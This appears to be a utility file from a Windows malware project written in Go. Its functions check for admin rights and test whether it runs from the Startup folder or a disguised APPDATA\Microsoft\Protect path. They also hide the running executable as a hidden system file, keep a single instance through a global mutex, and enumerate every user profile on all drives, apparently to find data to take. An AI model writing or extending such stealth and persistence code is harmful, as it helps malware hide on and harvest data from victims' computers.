package common

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"

	"github.com/shirou/gopsutil/v3/disk"
	"golang.org/x/sys/windows"
)

func IsElevated() bool {
	ret, _, _ := syscall.NewLazyDLL("shell32.dll").NewProc("IsUserAnAdmin").Call()
	return ret != 0
}

func IsInStartupPath() bool {
	exePath, err := os.Executable()
	if err != nil {
		return false
	}
	exePath = filepath.Dir(exePath)

	if exePath == "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" {
		return true
	}

	if exePath == filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Protect") {
		return true
	}

	return false
}

func HideSelf() {
	exe, err := os.Executable()
	if err != nil {
		return
	}

	cmd := exec.Command("attrib", "+h", "+s", exe)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	cmd.Run()
}

func IsAlreadyRunning() bool {
	const AppID = "3575651c-bb47-448e-a514-22865732bbc"

	_, err := windows.CreateMutex(nil, false, syscall.StringToUTF16Ptr(fmt.Sprintf("Global\\%s", AppID)))
	return err != nil
}

func GetUsers() []string {
	if IsElevated() {
		return []string{os.Getenv("USERPROFILE")}
	}

	var users []string
	drives, err := disk.Partitions(false)
	if err != nil {
		return []string{os.Getenv("USERPROFILE")}
	}

	for _, drive := range drives {
		mountpoint := drive.Mountpoint

		files, err := os.ReadDir(fmt.Sprintf("%s//Users", mountpoint))
		if err != nil {
			continue
		}

		for _, file := range files {
			if !file.IsDir() {
				continue
			}
			users = append(users, filepath.Join(fmt.Sprintf("%s//Users", mountpoint), file.Name()))
		}
	}

	return users
}

func RandString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}